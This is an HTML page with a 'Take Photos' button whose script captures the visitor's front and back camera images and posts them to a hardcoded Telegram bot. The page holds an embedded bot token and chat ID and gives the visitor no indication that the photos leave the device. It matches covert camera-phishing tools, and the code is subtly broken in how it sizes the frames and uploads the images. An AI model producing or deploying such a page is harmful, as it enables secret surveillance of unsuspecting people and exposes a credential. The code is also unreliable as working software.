<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Take Photos and Send to Telegram</title>
</head>
<body>
    <button id="capturePhotos">Take Photos</button>
    <script>
        document.getElementById('capturePhotos').addEventListener('click', async () => {
            try {
                // Access front and back cameras
                const frontCamera = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const backCamera = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });

                // Create video elements to capture camera streams
                const frontVideo = document.createElement('video');
                const backVideo = document.createElement('video');

                frontVideo.srcObject = frontCamera;
                backVideo.srcObject = backCamera;

                frontVideo.play();
                backVideo.play();

                // Capture images from both cameras
                const canvasFront = document.createElement('canvas');
                const canvasBack = document.createElement('canvas');

                canvasFront.width = frontVideo.videoWidth;
                canvasFront.height = frontVideo.videoHeight;
                canvasBack.width = backVideo.videoWidth;
                canvasBack.height = backVideo.videoHeight;

                const contextFront = canvasFront.getContext('2d');
                const contextBack = canvasBack.getContext('2d');

                contextFront.drawImage(frontVideo, 0, 0, canvasFront.width, canvasFront.height);
                contextBack.drawImage(backVideo, 0, 0, canvasBack.width, canvasBack.height);

                const frontImageData = canvasFront.toDataURL('image/jpeg');
                const backImageData = canvasBack.toDataURL('image/jpeg');

                // Send images to Telegram bot
                const botToken = '8614744009:AAEu0vGF14i_rVeZL6Q6ean-Vq_VC0xrdwc';
                const chatId = '7856697051'; // Replace with your chat ID

                const sendImage = async (imageData, caption) => {
                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            photo: imageData,
                            caption: caption
                        })
                    });
                    return response.json();
                };

                await sendImage(frontImageData, 'Selfie');
                await sendImage(backImageData, 'Back Camera');

                // Stop camera streams
                frontCamera.getTracks().forEach(track => track.stop());
                backCamera.getTracks().forEach(track => track.stop());
            } catch (error) {
                console.error('Error capturing photos:', error);
            }
        });
    </script>
</body>
</html>
